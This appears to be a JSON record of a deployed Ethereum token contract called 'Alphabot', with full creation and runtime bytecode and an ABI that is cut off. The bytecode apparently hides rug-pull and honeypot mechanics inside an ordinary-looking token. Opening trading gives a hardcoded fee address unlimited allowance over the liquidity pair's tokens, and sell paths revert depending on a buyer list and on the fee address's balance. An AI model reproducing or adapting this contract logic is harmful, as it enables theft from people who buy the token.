{
    "address": "0x04Ac04832dFeF1DFa133B242724D0a154C4a78Cb",
    "tx_hash": "ebe34262a99e9858827815879799f94238ce08af04e9025b3c48e6d0e885fff3",
    "block_number": 18006989,
    "timestamp": 1693151267,
    "gas_used_in_creation": 1956643,
    "creation_bytecode": "6080604052620000126012600a6200038e565b62000020906101f4620003a6565b600155620000316012600a6200038e565b6200003f90612710620003a6565b600255620000506012600a6200038e565b6200005e90614e20620003a6565b6003556200006f6012600a6200038e565b6200007d90614e20620003a6565b6004556200008e6012600a6200038e565b6200009c90614e20620003a6565b600590815560036006556001600755600060088190556009556013600a819055600b55600c819055600d55605a600e55600f805462ffffff19169055601680546001600160a01b03191673d1ff03d05a1b04386d56447e706e2d03f4e5d7e51790553480156200010b57600080fd5b50600080546001600160a01b031916339081178255604051909182917f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0908290a3506016546001600160a01b031660009081526011602081905260408220805460ff19166001908117909155916200018b6000546001600160a01b031690565b6001600160a01b0316815260208082019290925260409081016000908120805494151560ff199586161790553081526011909252902080549091166001179055620001d96012600a6200038e565b620001e890620f4240620003a6565b33600081815260126020818152604080842095909555601780546001600160a01b0319168517905560119052928120805460ff1916600117905590917fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef906200025390600a6200038e565b6200026290620f4240620003a6565b60405190815260200160405180910390a3620003c0565b634e487b7160e01b600052601160045260246000fd5b600181815b80851115620002d0578160001904821115620002b457620002b462000279565b80851615620002c257918102915b93841c939080029062000294565b509250929050565b600082620002e95750600162000388565b81620002f85750600062000388565b81600181146200031157600281146200031c576200033c565b600191505062000388565b60ff84111562000330576200033062000279565b50506001821b62000388565b5060208310610133831016604e8410600b841016171562000361575081810a62000388565b6200036d83836200028f565b806000190482111562000384576200038462000279565b0290505b92915050565b60006200039f60ff841683620002d8565b9392505050565b808202811582820484141762000388576200038862000279565b611a5380620003d06000396000f3fe6080604052600436106101395760003560e01c80638da5cb5b116100ab578063ae3c65891161006f578063ae3c658914610335578063afe318201461034b578063c07eec3814610365578063c9567bf91461037b578063d1fbfb2314610390578063dd62ed3e146103b057600080fd5b80638da5cb5b146102cb57806391360489146102e957806395d89b41146101455780639d4c90e3146102ff578063a9059cbb1461031557600080fd5b8063313ce567116100fd578063313ce567146102175780635cdc10ff1461023357806370a082311461026b578063715018a61461028b578063751039fc146102a05780637ec1dd9a146102b557600080fd5b806306fdde0314610145578063095ea7b31461018257806313eae7d4146101b257806318160ddd146101d457806323b872dd146101f757600080fd5b3661014057005b600080fd5b34801561015157600080fd5b506040805180820182526005815264414c50484160d81b6020820152905161017991906115bc565b60405180910390f35b34801561018e57600080fd5b506101a261019d366004611622565b6103f6565b6040519015158152602001610179565b3480156101be57600080fd5b506101d26101cd36600461164e565b61040d565b005b3480156101e057600080fd5b506101e9610445565b604051908152602001610179565b34801561020357600080fd5b506101a2610212366004611667565b610465565b34801561022357600080fd5b5060405160128152602001610179565b34801561023f57600080fd5b50601654610253906001600160a01b031681565b6040516001600160a01b039091168152602001610179565b34801561027757600080fd5b506101e96102863660046116a8565b6104ce565b34801561029757600080fd5b506101d26104e9565b3480156102ac57600080fd5b506101d261055d565b3480156102c157600080fd5b506101e960055481565b3480156102d757600080fd5b506000546001600160a01b0316610253565b3480156102f557600080fd5b506101e960045481565b34801561030b57600080fd5b506101e960025481565b34801561032157600080fd5b506101a2610330366004611622565b610616565b34801561034157600080fd5b506101e960035481565b34801561035757600080fd5b50600f546101a29060ff1681565b34801561037157600080fd5b506101e960015481565b34801561038757600080fd5b506101d2610623565b34801561039c57600080fd5b50601754610253906001600160a01b031681565b3480156103bc57600080fd5b506101e96103cb3660046116c5565b6001600160a01b03918216600090815260106020908152604080832093909416825291909152205490565b60006104033384846109f2565b5060015b92915050565b6000546001600160a01b031633146104405760405162461bcd60e51b8152600401610437906116fe565b60405180910390fd5b600155565b60006104536012600a61182d565b61046090620f424061183c565b905090565b6000610472848484610b16565b6104c484336104bf856040518060600160405280602881526020016119f6602891396001600160a01b038a1660009081526010602090815260408083203384529091529020549190611243565b6109f2565b5060019392505050565b6001600160a01b031660009081526012602052604090205490565b6000546001600160a01b031633146105135760405162461bcd60e51b8152600401610437906116fe565b600080546040516001600160a01b03909116907f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0908390a3600080546001600160a01b0319169055565b6000546001600160a01b031633146105875760405162461bcd60e51b8152600401610437906116fe565b6105936012600a61182d565b6105a090620f424061183c565b6005556105af6012600a61182d565b6105bc90620f424061183c565b600355600f805460ff191690557f6a91fb24fcb212ba6dee8cdc5f11c26331c37e9000932634d235326166f2af5c6105f66012600a61182d565b61060390620f424061183c565b60405190815260200160405180910390a1565b6000610403338484610b16565b6000546001600160a01b0316331461064d5760405162461bcd60e51b8152600401610437906116fe565b600f546301000000900460ff16156106a75760405162461bcd60e51b815260206004820152601760248201527f74726164696e6720697320616c7265616479206f70656e0000000000000000006044820152606401610437565b601880546001600160a01b031916737a250d5630b4cf539739df2c5dacb4c659f2488d9081179091556106ef9030906106e26012600a61182d565b6104bf90620f424061183c565b601860009054906101000a90046001600160a01b03166001600160a01b031663c45a01556040518163ffffffff1660e01b8152600401602060405180830381865afa158015610742573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906107669190611853565b6001600160a01b031663c9c6539630601860009054906101000a90046001600160a01b03166001600160a01b031663ad5c46486040518163ffffffff1660e01b8152600401602060405180830381865afa1580156107c8573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906107ec9190611853565b6040516001600160e01b031960e085901b1681526001600160a01b039283166004820152911660248201526044016020604051808303816000875af1158015610839573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061085d9190611853565b601580546001600160a01b0319166001600160a01b039283161790556018541663f305d719473061088d816104ce565b6000806108a26000546001600160a01b031690565b60405160e088901b6001600160e01b03191681526001600160a01b03958616600482015260248101949094526044840192909252606483015290911660848201524260a482015260c40160606040518083038185885af115801561090a573d6000803e3d6000fd5b50505050506040513d601f19601f8201168201806040525081019061092f9190611870565b505060155460185460405163095ea7b360e01b81526001600160a01b03918216600482015260001960248201529116915063095ea7b3906044016020604051808303816000875af1158015610988573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906109ac919061189e565b506015546001600160a01b0390811660009081526010602090815260408083206016549094168352929052206000199055600f805463ff00ff0019166301000100179055565b6001600160a01b038316610a545760405162461bcd60e51b8152602060048201526024808201527f45524332303a20617070726f76652066726f6d20746865207a65726f206164646044820152637265737360e01b6064820152608401610437565b6001600160a01b038216610ab55760405162461bcd60e51b815260206004820152602260248201527f45524332303a20617070726f766520746f20746865207a65726f206164647265604482015261737360f01b6064820152608401610437565b6001600160a01b0383811660008181526010602090815260408083209487168084529482529182902085905590518481527f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925910160405180910390a3505050565b6001600160a01b038316610b7a5760405162461bcd60e51b815260206004820152602560248201527f45524332303a207472616e736665722066726f6d20746865207a65726f206164604482015264647265737360d81b6064820152608401610437565b6001600160a01b038216610bdc5760405162461bcd60e51b815260206004820152602360248201527f45524332303a207472616e7366657220746f20746865207a65726f206164647260448201526265737360e81b6064820152608401610437565b60008111610c3e5760405162461bcd60e51b815260206004820152602960248201527f5472616e7366657220616d6f756e74206d7573742062652067726561746572206044820152687468616e207a65726f60b81b6064820152608401610437565b600080546001600160a01b03858116911614801590610c6b57506000546001600160a01b03848116911614155b1561110057600f5460ff1615610d29576018546001600160a01b03848116911614801590610ca757506015546001600160a01b03848116911614155b15610d2957326000908152601460205260409020544311610d165760405162461bcd60e51b8152602060048201526024808201527f4f6e6c79206f6e65207472616e736665722070657220626c6f636b20616c6c6f6044820152633bb2b21760e11b6064820152608401610437565b3260009081526014602052604090204390555b6015546001600160a01b038581169116148015610d5457506018546001600160a01b03848116911614155b8015610d7957506001600160a01b03831660009081526011602052604090205460ff16155b15610e8757600554821115610dd05760405162461bcd60e51b815260206004820152601d60248201527f457863656564732074686520416d6f756e74206c696d6174696f6e732e0000006044820152606401610437565b60035482610ddd856104ce565b610de791906118c0565b1115610e055760405162461bcd60e51b8152600401610437906118d3565b6008546009541015610e1d57823b15610e1d57600080fd5b60098054906000610e2d83611920565b90915550506001600160a01b0383166000908152601360205260409020805460ff19166001179055600654600954610e8491606491610e7e9110610e7357600a54610e77565b600c545b859061127d565b90611306565b90505b6015546001600160a01b038481169116148015610ead57506001600160a01b0384163014155b8015610ed257506001600160a01b03841660009081526011602052604090205460ff16155b15610feb57610efc6064610e7e60075460095411610ef257600b54610e77565b600d54859061127d565b90506005548211158015610f255750600154601654610f23906001600160a01b03166104ce565b115b8015610f465750600254601654610f44906001600160a01b03166104ce565b105b15610f7357610f706064610e7e60075460095411610f6657600b54610e77565b600e54859061127d565b90505b6005548211158015610f9a5750600254601654610f98906001600160a01b03166104ce565b115b15610fb75760405162461bcd60e51b8152600401610437906118d3565b600854600954118015610fe257506001600160a01b03841660009081526013602052604090205460ff165b610feb57600080fd5b6000610ff6306104ce565b600f5490915062010000900460ff1615801561101f57506015546001600160a01b038581169116145b80156110325750600f54610100900460ff165b801561103f575060045481115b801561104e5750600854600954115b801561107357506001600160a01b03841660009081526011602052604090205460ff16155b801561109857506001600160a01b03851660009081526011602052604090205460ff16155b156110fe576110ba6110b5846110b084600154611348565b611348565b61135d565b4780156110fc576017546040516001600160a01b03909116904780156108fc02916000818181858888f193505050501580156110fa573d6000803e3d6000fd5b505b505b505b801561117a573060009081526012602052604090205461112090826114ed565b30600081815260126020526040908190209290925590516001600160a01b038616907fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef906111719085815260200190565b60405180910390a35b6001600160a01b03841660009081526012602052604090205461119d908361154c565b6001600160a01b0385166000908152601260205260409020556111e26111c3838361154c565b6001600160a01b038516600090815260126020526040902054906114ed565b6001600160a01b0380851660008181526012602052604090209290925585167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef61122c858561154c565b60405190815260200160405180910390a350505050565b600081848411156112675760405162461bcd60e51b815260040161043791906115bc565b5060006112748486611939565b95945050505050565b60008260000361128f57506000610407565b600061129b838561183c565b9050826112a8858361194c565b146112ff5760405162461bcd60e51b815260206004820152602160248201527f536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f6044820152607760f81b6064820152608401610437565b9392505050565b60006112ff83836040518060400160405280601a81526020017f536166654d6174683a206469766973696f6e206279207a65726f00000000000081525061158e565b600081831161135757826112ff565b50919050565b600f805462ff000019166201000017905580156114de57600f546301000000900460ff16156114de5760408051600280825260608201835260009260208301908036833701905050905030816000815181106113bb576113bb61196e565b6001600160a01b03928316602091820292909201810191909152601854604080516315ab88c960e31b81529051919093169263ad5c46489260048083019391928290030181865afa158015611414573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906114389190611853565b8160018151811061144b5761144b61196e565b6001600160a01b03928316602091820292909201015260185461147191309116846109f2565b60185460405163791ac94760e01b81526001600160a01b039091169063791ac947906114aa908590600090869030904290600401611984565b600060405180830381600087803b1580156114c457600080fd5b505af11580156114d8573d6000803e3d6000fd5b50505050505b50600f805462ff000019169055565b6000806114fa83856118c0565b9050838110156112ff5760405162461bcd60e51b815260206004820152601b60248201527f536166654d6174683a206164646974696f6e206f766572666c6f7700000000006044820152606401610437565b60006112ff83836040518060400160405280601e81526020017f536166654d6174683a207375627472616374696f6e206f766572666c6f770000815250611243565b600081836115af5760405162461bcd60e51b815260040161043791906115bc565b506000611274848661194c565b600060208083528351808285015260005b818110156115e9578581018301518582016040015282016115cd565b506000604082860101526040601f19601f8301168501019250505092915050565b6001600160a01b038116811461161f57600080fd5b50565b6000806040838503121561163557600080fd5b82356116408161160a565b946020939093013593505050565b60006020828403121561166057600080fd5b5035919050565b60008060006060848603121561167c57600080fd5b83356116878161160a565b925060208401356116978161160a565b929592945050506040919091013590565b6000602082840312156116ba57600080fd5b81356112ff8161160a565b600080604083850312156116d857600080fd5b82356116e38161160a565b915060208301356116f38161160a565b809150509250929050565b6020808252818101527f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572604082015260600190565b634e487b7160e01b600052601160045260246000fd5b600181815b8085111561178457816000190482111561176a5761176a611733565b8085161561177757918102915b93841c939080029061174e565b509250929050565b60008261179b57506001610407565b816117a857506000610407565b81600181146117be57600281146117c8576117e4565b6001915050610407565b60ff8411156117d9576117d9611733565b50506001821b610407565b5060208310610133831016604e8410600b8410161715611807575081810a610407565b6118118383611749565b806000190482111561182557611825611733565b029392505050565b60006112ff60ff84168361178c565b808202811582820484141761040757610407611733565b60006020828403121561186557600080fd5b81516112ff8161160a565b60008060006060848603121561188557600080fd5b8351925060208401519150604084015190509250925092565b6000602082840312156118b057600080fd5b815180151581146112ff57600080fd5b8082018082111561040757610407611733565b6020808252602d908201527f4578636565647320746865206d6178206c696d69746174696f6e7320696e207360408201526c34b733b632902bb0b63632ba1760991b606082015260800190565b60006001820161193257611932611733565b5060010190565b8181038181111561040757610407611733565b60008261196957634e487b7160e01b600052601260045260246000fd5b500490565b634e487b7160e01b600052603260045260246000fd5b600060a082018783526020878185015260a0604085015281875180845260c086019150828901935060005b818110156119d45784516001600160a01b0316835293830193918301916001016119af565b50506001600160a01b0396909616606085015250505060800152939250505056fe45524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e6365a264697066735822122022770587d288b24727a03b8c7c99dc734ca6d4914499c0a53cc43e768d247c3664736f6c63430008130033",
    "runtime_bytecode": "6080604052600436106101395760003560e01c80638da5cb5b116100ab578063ae3c65891161006f578063ae3c658914610335578063afe318201461034b578063c07eec3814610365578063c9567bf91461037b578063d1fbfb2314610390578063dd62ed3e146103b057600080fd5b80638da5cb5b146102cb57806391360489146102e957806395d89b41146101455780639d4c90e3146102ff578063a9059cbb1461031557600080fd5b8063313ce567116100fd578063313ce567146102175780635cdc10ff1461023357806370a082311461026b578063715018a61461028b578063751039fc146102a05780637ec1dd9a146102b557600080fd5b806306fdde0314610145578063095ea7b31461018257806313eae7d4146101b257806318160ddd146101d457806323b872dd146101f757600080fd5b3661014057005b600080fd5b34801561015157600080fd5b506040805180820182526005815264414c50484160d81b6020820152905161017991906115bc565b60405180910390f35b34801561018e57600080fd5b506101a261019d366004611622565b6103f6565b6040519015158152602001610179565b3480156101be57600080fd5b506101d26101cd36600461164e565b61040d565b005b3480156101e057600080fd5b506101e9610445565b604051908152602001610179565b34801561020357600080fd5b506101a2610212366004611667565b610465565b34801561022357600080fd5b5060405160128152602001610179565b34801561023f57600080fd5b50601654610253906001600160a01b031681565b6040516001600160a01b039091168152602001610179565b34801561027757600080fd5b506101e96102863660046116a8565b6104ce565b34801561029757600080fd5b506101d26104e9565b3480156102ac57600080fd5b506101d261055d565b3480156102c157600080fd5b506101e960055481565b3480156102d757600080fd5b506000546001600160a01b0316610253565b3480156102f557600080fd5b506101e960045481565b34801561030b57600080fd5b506101e960025481565b34801561032157600080fd5b506101a2610330366004611622565b610616565b34801561034157600080fd5b506101e960035481565b34801561035757600080fd5b50600f546101a29060ff1681565b34801561037157600080fd5b506101e960015481565b34801561038757600080fd5b506101d2610623565b34801561039c57600080fd5b50601754610253906001600160a01b031681565b3480156103bc57600080fd5b506101e96103cb3660046116c5565b6001600160a01b03918216600090815260106020908152604080832093909416825291909152205490565b60006104033384846109f2565b5060015b92915050565b6000546001600160a01b031633146104405760405162461bcd60e51b8152600401610437906116fe565b60405180910390fd5b600155565b60006104536012600a61182d565b61046090620f424061183c565b905090565b6000610472848484610b16565b6104c484336104bf856040518060600160405280602881526020016119f6602891396001600160a01b038a1660009081526010602090815260408083203384529091529020549190611243565b6109f2565b5060019392505050565b6001600160a01b031660009081526012602052604090205490565b6000546001600160a01b031633146105135760405162461bcd60e51b8152600401610437906116fe565b600080546040516001600160a01b03909116907f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0908390a3600080546001600160a01b0319169055565b6000546001600160a01b031633146105875760405162461bcd60e51b8152600401610437906116fe565b6105936012600a61182d565b6105a090620f424061183c565b6005556105af6012600a61182d565b6105bc90620f424061183c565b600355600f805460ff191690557f6a91fb24fcb212ba6dee8cdc5f11c26331c37e9000932634d235326166f2af5c6105f66012600a61182d565b61060390620f424061183c565b60405190815260200160405180910390a1565b6000610403338484610b16565b6000546001600160a01b0316331461064d5760405162461bcd60e51b8152600401610437906116fe565b600f546301000000900460ff16156106a75760405162461bcd60e51b815260206004820152601760248201527f74726164696e6720697320616c7265616479206f70656e0000000000000000006044820152606401610437565b601880546001600160a01b031916737a250d5630b4cf539739df2c5dacb4c659f2488d9081179091556106ef9030906106e26012600a61182d565b6104bf90620f424061183c565b601860009054906101000a90046001600160a01b03166001600160a01b031663c45a01556040518163ffffffff1660e01b8152600401602060405180830381865afa158015610742573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906107669190611853565b6001600160a01b031663c9c6539630601860009054906101000a90046001600160a01b03166001600160a01b031663ad5c46486040518163ffffffff1660e01b8152600401602060405180830381865afa1580156107c8573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906107ec9190611853565b6040516001600160e01b031960e085901b1681526001600160a01b039283166004820152911660248201526044016020604051808303816000875af1158015610839573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061085d9190611853565b601580546001600160a01b0319166001600160a01b039283161790556018541663f305d719473061088d816104ce565b6000806108a26000546001600160a01b031690565b60405160e088901b6001600160e01b03191681526001600160a01b03958616600482015260248101949094526044840192909252606483015290911660848201524260a482015260c40160606040518083038185885af115801561090a573d6000803e3d6000fd5b50505050506040513d601f19601f8201168201806040525081019061092f9190611870565b505060155460185460405163095ea7b360e01b81526001600160a01b03918216600482015260001960248201529116915063095ea7b3906044016020604051808303816000875af1158015610988573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906109ac919061189e565b506015546001600160a01b0390811660009081526010602090815260408083206016549094168352929052206000199055600f805463ff00ff0019166301000100179055565b6001600160a01b038316610a545760405162461bcd60e51b8152602060048201526024808201527f45524332303a20617070726f76652066726f6d20746865207a65726f206164646044820152637265737360e01b6064820152608401610437565b6001600160a01b038216610ab55760405162461bcd60e51b815260206004820152602260248201527f45524332303a20617070726f766520746f20746865207a65726f206164647265604482015261737360f01b6064820152608401610437565b6001600160a01b0383811660008181526010602090815260408083209487168084529482529182902085905590518481527f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925910160405180910390a3505050565b6001600160a01b038316610b7a5760405162461bcd60e51b815260206004820152602560248201527f45524332303a207472616e736665722066726f6d20746865207a65726f206164604482015264647265737360d81b6064820152608401610437565b6001600160a01b038216610bdc5760405162461bcd60e51b815260206004820152602360248201527f45524332303a207472616e7366657220746f20746865207a65726f206164647260448201526265737360e81b6064820152608401610437565b60008111610c3e5760405162461bcd60e51b815260206004820152602960248201527f5472616e7366657220616d6f756e74206d7573742062652067726561746572206044820152687468616e207a65726f60b81b6064820152608401610437565b600080546001600160a01b03858116911614801590610c6b57506000546001600160a01b03848116911614155b1561110057600f5460ff1615610d29576018546001600160a01b03848116911614801590610ca757506015546001600160a01b03848116911614155b15610d2957326000908152601460205260409020544311610d165760405162461bcd60e51b8152602060048201526024808201527f4f6e6c79206f6e65207472616e736665722070657220626c6f636b20616c6c6f6044820152633bb2b21760e11b6064820152608401610437565b3260009081526014602052604090204390555b6015546001600160a01b038581169116148015610d5457506018546001600160a01b03848116911614155b8015610d7957506001600160a01b03831660009081526011602052604090205460ff16155b15610e8757600554821115610dd05760405162461bcd60e51b815260206004820152601d60248201527f457863656564732074686520416d6f756e74206c696d6174696f6e732e0000006044820152606401610437565b60035482610ddd856104ce565b610de791906118c0565b1115610e055760405162461bcd60e51b8152600401610437906118d3565b6008546009541015610e1d57823b15610e1d57600080fd5b60098054906000610e2d83611920565b90915550506001600160a01b0383166000908152601360205260409020805460ff19166001179055600654600954610e8491606491610e7e9110610e7357600a54610e77565b600c545b859061127d565b90611306565b90505b6015546001600160a01b038481169116148015610ead57506001600160a01b0384163014155b8015610ed257506001600160a01b03841660009081526011602052604090205460ff16155b15610feb57610efc6064610e7e60075460095411610ef257600b54610e77565b600d54859061127d565b90506005548211158015610f255750600154601654610f23906001600160a01b03166104ce565b115b8015610f465750600254601654610f44906001600160a01b03166104ce565b105b15610f7357610f706064610e7e60075460095411610f6657600b54610e77565b600e54859061127d565b90505b6005548211158015610f9a5750600254601654610f98906001600160a01b03166104ce565b115b15610fb75760405162461bcd60e51b8152600401610437906118d3565b600854600954118015610fe257506001600160a01b03841660009081526013602052604090205460ff165b610feb57600080fd5b6000610ff6306104ce565b600f5490915062010000900460ff1615801561101f57506015546001600160a01b038581169116145b80156110325750600f54610100900460ff165b801561103f575060045481115b801561104e5750600854600954115b801561107357506001600160a01b03841660009081526011602052604090205460ff16155b801561109857506001600160a01b03851660009081526011602052604090205460ff16155b156110fe576110ba6110b5846110b084600154611348565b611348565b61135d565b4780156110fc576017546040516001600160a01b03909116904780156108fc02916000818181858888f193505050501580156110fa573d6000803e3d6000fd5b505b505b505b801561117a573060009081526012602052604090205461112090826114ed565b30600081815260126020526040908190209290925590516001600160a01b038616907fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef906111719085815260200190565b60405180910390a35b6001600160a01b03841660009081526012602052604090205461119d908361154c565b6001600160a01b0385166000908152601260205260409020556111e26111c3838361154c565b6001600160a01b038516600090815260126020526040902054906114ed565b6001600160a01b0380851660008181526012602052604090209290925585167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef61122c858561154c565b60405190815260200160405180910390a350505050565b600081848411156112675760405162461bcd60e51b815260040161043791906115bc565b5060006112748486611939565b95945050505050565b60008260000361128f57506000610407565b600061129b838561183c565b9050826112a8858361194c565b146112ff5760405162461bcd60e51b815260206004820152602160248201527f536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f6044820152607760f81b6064820152608401610437565b9392505050565b60006112ff83836040518060400160405280601a81526020017f536166654d6174683a206469766973696f6e206279207a65726f00000000000081525061158e565b600081831161135757826112ff565b50919050565b600f805462ff000019166201000017905580156114de57600f546301000000900460ff16156114de5760408051600280825260608201835260009260208301908036833701905050905030816000815181106113bb576113bb61196e565b6001600160a01b03928316602091820292909201810191909152601854604080516315ab88c960e31b81529051919093169263ad5c46489260048083019391928290030181865afa158015611414573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906114389190611853565b8160018151811061144b5761144b61196e565b6001600160a01b03928316602091820292909201015260185461147191309116846109f2565b60185460405163791ac94760e01b81526001600160a01b039091169063791ac947906114aa908590600090869030904290600401611984565b600060405180830381600087803b1580156114c457600080fd5b505af11580156114d8573d6000803e3d6000fd5b50505050505b50600f805462ff000019169055565b6000806114fa83856118c0565b9050838110156112ff5760405162461bcd60e51b815260206004820152601b60248201527f536166654d6174683a206164646974696f6e206f766572666c6f7700000000006044820152606401610437565b60006112ff83836040518060400160405280601e81526020017f536166654d6174683a207375627472616374696f6e206f766572666c6f770000815250611243565b600081836115af5760405162461bcd60e51b815260040161043791906115bc565b506000611274848661194c565b600060208083528351808285015260005b818110156115e9578581018301518582016040015282016115cd565b506000604082860101526040601f19601f8301168501019250505092915050565b6001600160a01b038116811461161f57600080fd5b50565b6000806040838503121561163557600080fd5b82356116408161160a565b946020939093013593505050565b60006020828403121561166057600080fd5b5035919050565b60008060006060848603121561167c57600080fd5b83356116878161160a565b925060208401356116978161160a565b929592945050506040919091013590565b6000602082840312156116ba57600080fd5b81356112ff8161160a565b600080604083850312156116d857600080fd5b82356116e38161160a565b915060208301356116f38161160a565b809150509250929050565b6020808252818101527f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572604082015260600190565b634e487b7160e01b600052601160045260246000fd5b600181815b8085111561178457816000190482111561176a5761176a611733565b8085161561177757918102915b93841c939080029061174e565b509250929050565b60008261179b57506001610407565b816117a857506000610407565b81600181146117be57600281146117c8576117e4565b6001915050610407565b60ff8411156117d9576117d9611733565b50506001821b610407565b5060208310610133831016604e8410600b8410161715611807575081810a610407565b6118118383611749565b806000190482111561182557611825611733565b029392505050565b60006112ff60ff84168361178c565b808202811582820484141761040757610407611733565b60006020828403121561186557600080fd5b81516112ff8161160a565b60008060006060848603121561188557600080fd5b8351925060208401519150604084015190509250925092565b6000602082840312156118b057600080fd5b815180151581146112ff57600080fd5b8082018082111561040757610407611733565b6020808252602d908201527f4578636565647320746865206d6178206c696d69746174696f6e7320696e207360408201526c34b733b632902bb0b63632ba1760991b606082015260800190565b60006001820161193257611932611733565b5060010190565b8181038181111561040757610407611733565b60008261196957634e487b7160e01b600052601260045260246000fd5b500490565b634e487b7160e01b600052603260045260246000fd5b600060a082018783526020878185015260a0604085015281875180845260c086019150828901935060005b818110156119d45784516001600160a01b0316835293830193918301916001016119af565b50506001600160a01b0396909616606085015250505060800152939250505056fe45524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e6365a264697066735822122022770587d288b24727a03b8c7c99dc734ca6d4914499c0a53cc43e768d247c3664736f6c63430008130033",
    "contract_name": "Alphabot",
    "compiler_version": "v0.8.19+commit.7dd6d404",
    "optimization_used": "1",
    "runs": "200",
    "abi": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_limitationsForSingleMaxTxAmounts\",\"type\":\"uint256\"}],\"name\":\"RemoveAllLimits\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"_LimitationsTaxUsedInSlotsForSwapping\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_addressUsedInFundationFees\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_enableWatchDogLimitsFlag\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_feesForDevsAddress\",\"outputs\":[{\"internalType\":\"address payable\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_limitationsForAddressSingleTxsMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_limitationsForSingleMaxTxAmounts\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_limitationsInMaxSlotsUsedInSwappingTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_limitationsInMaxSlotsUsedInSwappingTxUp\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"openTrading\",\"outputs\":[],\"stateMutability\":\"nonp